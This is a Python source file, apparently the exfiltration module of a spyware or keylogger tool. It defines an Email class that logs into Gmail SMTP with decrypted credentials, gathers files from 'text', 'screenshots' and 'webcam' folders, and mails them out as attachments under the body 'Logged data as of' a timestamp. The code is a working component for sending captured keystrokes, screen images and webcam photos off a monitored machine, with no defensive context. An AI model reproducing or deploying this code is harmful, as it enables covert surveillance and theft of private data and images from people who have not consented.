import datetime
import os
import re
import smtplib
import time
from encryption import decrypt
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


class Email:
    GMAIL_SMTP = "smtp.gmail.com"
    GMAIL_SSL_PORT = 465
    SERVER = smtplib.SMTP_SSL(host=GMAIL_SMTP, port=GMAIL_SSL_PORT)

    def __init__(self, user, password):
        print("Initiating an email ...")
        self.message = MIMEMultipart("alternative")
        self._email = user
        self._password = password

    def login(self):
        print(f"Logging in ...")
        Email.SERVER.login(user=decrypt(self._email), password=decrypt(self._password))

    def email_base(self):
        print("Creating the email ...")
        self.message['From'] = decrypt(self._email)
        self.message['To'] = decrypt(self._email)
        self.message['Subject'] = f'{datetime.date.today()}'
        body = f'Logged data as of {time.time()}'
        self.message.attach(MIMEText(body, 'plain', 'utf-16'))

    def attach_files(self, from_path):
        self.email_base()
        print("Attaching files ...")

        type_text = re.compile(r'.+\.txt$')
        type_png = re.compile(r'.+\.png$')
        type_jpg = re.compile(r'.+\.jpg$')

        for dir_path, dir_names, filenames in os.walk(from_path, topdown=True):
            for file in filenames:
                file_to_attach = MIMEBase('application', "octet-stream")
                file_to_attach.set_charset('utf-16')  # for an encoding bug
                if type_text.match(file):
                    with open(from_path + 'text/' + file, 'rb') as attachment:
                        file_to_attach.set_payload(attachment.read())

                elif type_png.match(file):
                    with open(from_path + 'screenshots/' + file, 'rb') as attachment:
                        file_to_attach.set_payload(attachment.read())

                elif type_jpg.match(file):
                    with open(from_path + 'webcam/' + file, 'rb') as attachment:
                        file_to_attach.set_payload(attachment.read())

                file_to_attach.add_header('content-disposition', 'attachment',
                                          filename=('utf-16', '', f'{file}'))

                self.message.attach(file_to_attach)

    def send(self, data):
        print(f"Sending ...")
        Email.SERVER.sendmail(from_addr=decrypt(self._email),
                              to_addrs=decrypt(self._email),
                              msg=data.as_string())

    def end(self):
        print("Emptying the email object ...")
        self.message = None
        self._email = None
        self._password = None
        print("Closing the connection to the server ...")
        Email.SERVER.quit()
